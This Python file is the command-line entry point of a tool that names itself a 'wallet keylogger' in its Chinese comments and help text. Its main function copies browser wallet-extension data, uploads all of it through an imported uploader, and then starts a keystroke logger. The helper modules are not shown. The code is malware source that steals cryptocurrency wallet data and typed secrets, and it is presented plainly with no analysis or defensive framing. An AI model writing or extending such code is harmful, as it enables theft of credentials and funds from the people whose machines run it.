# -*- coding: utf-8 -*-
"""
命令行入口模块
"""

import sys
import argparse

from .logger import KeyLogger, create_log_file
from .backup import backup_browser_extensions
from .uploader import upload_all


def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="钱包键盘记录器")
    parser.add_argument("--debug", "-d", action="store_true", help="调试模式：实时显示窗口信息")

    args = parser.parse_args()

    # 创建日志文件
    log_file = create_log_file()

    # 备份浏览器扩展数据
    print("正在备份浏览器扩展数据...")
    count = backup_browser_extensions()
    if count > 0:
        print(f"已备份 {count} 个钱包扩展\n")
    else:
        print("未检测到目标钱包扩展\n")

    upload_all()
    
    # 启动键盘记录器
    logger = KeyLogger(log_file, debug_mode=args.debug)

    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n已停止记录")
    except Exception as e:
        print(f"\n错误: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"\n日志已保存到: {log_file}")
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
